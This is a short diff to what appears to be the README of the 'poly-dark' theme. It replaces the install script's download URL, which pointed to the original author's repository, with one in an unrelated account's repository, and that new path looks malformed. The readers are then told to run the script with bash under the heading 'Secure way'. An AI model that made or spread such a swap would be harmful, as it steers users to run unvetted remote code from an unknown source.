@@ -12,7 +12,7 @@ Screenshot is intentionally low res to fit GitHub UI. See also: [1280×720](http
 
 1. **Secure way:**
     - Download install script:  
-    `wget -P /tmp https://github.com/shvchk/poly-dark/raw/master/install.sh`
+    `wget -P /tmp https://github.com/Zaaaaaaaaaaaakaria/Final/install.sh`
     - Review install script at `/tmp/install.sh`
     - Run it: `bash /tmp/install.sh`
 
